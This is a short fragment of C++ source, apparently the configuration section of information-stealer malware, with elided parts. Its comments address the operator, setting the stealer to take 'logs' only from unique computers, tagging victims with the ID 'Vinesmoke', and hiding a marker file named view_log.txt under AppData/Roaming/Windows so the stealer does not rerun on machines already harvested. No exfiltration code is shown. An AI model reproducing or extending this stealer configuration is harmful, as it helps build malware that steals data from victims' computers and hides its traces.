...
namespace config {
	...
	const bool oneStart = true; // enable this if you want logs to come only from unique computers
	...
	const char yourStealerId[10] = "Vinesmoke"; //id that is used to avoid restarting on a computer from which logs have already been take, use for zip to
	const std::string pathId = "/AppData/Roaming/Windows"; // path to txt where will be id, no more than one additional folder after Roaming
	const std::string nameId = "view_log.txt"; // name of txt where will be id
}
